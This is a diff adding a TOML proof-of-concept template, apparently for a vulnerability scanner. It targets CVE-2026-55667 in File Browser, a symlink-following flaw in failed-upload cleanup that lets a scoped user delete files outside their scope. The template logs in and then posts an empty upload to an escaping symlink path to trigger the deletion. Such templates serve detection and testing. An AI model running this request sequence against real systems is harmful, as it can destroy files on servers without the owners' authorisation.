@@ -1,0 +1,58 @@
+[info]
+author = "ave"
+description = "检测 File Browser 2.63.16 之前版本中，仅拥有 Create 权限的作用域用户通过上传失败清理路径中的符号链接跟随漏洞，删除作用域外任意文件。通过登录后向包含逃逸符号链接的路径上传文件触发失败清理，验证是否可删除目标文件。"
+id = "POC-AVE-2026-0631"
+name = "File Browser 路径遍历任意文件删除漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2026-55667",
+    "filebrowser",
+    "path-traversal",
+    "symlink",
+]
+vuln_id = [
+    "CVE-2026-55667",
+    "AVE-2026-0631",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"{{username}}","password":"{{password}}"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"token"']
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/upload/{{scope_path}}/{{symlink_dir}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+X-Auth = "{{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "failed",
+]
